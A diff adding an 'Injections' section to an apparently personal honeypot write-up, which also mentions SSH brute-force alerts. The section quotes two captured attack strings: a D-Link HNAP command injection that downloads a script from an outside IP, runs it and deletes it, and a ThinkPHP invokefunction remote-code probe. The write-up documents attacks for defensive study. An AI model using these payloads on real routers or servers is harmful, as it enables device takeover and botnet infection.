@@ -57,6 +57,16 @@ Jan 26 17:08:12 honeypot-1 sshguard[788]: Blocking 121.5.9.52 for 840 secs (4 at
 
 These alerts are from the auth.log indicating attempts of ssh brute-forcing. After only three days of being up, my honeypot was already getting tested by loud tactics. By what sshguard could catch, there were 12 definite attempts; however, looking at the full log, there are actually a handful of persistent ip's that test periodically. 
 
+### Injections
+```
+SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://107.189.12.195/wget.sh;chmod 777 wget.sh;sh wget.sh selfrep.dlink;rm -rf wget.sh`"
+
+/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
+```
+
+Above are a couple of injection attempts. Both caused my honeypot to issue error 400's, but these seem done manually. The first one attempts to download some script, run it, and delete itself afterwards. The second tries to get a php backend to return some information, maybe.
+
+### Malware Network Indication
 
 
 [honeypot]: https://blog.malwarebytes.com/101/2021/05/what-is-a-honeypot-how-they-are-used-in-cybersecurity/
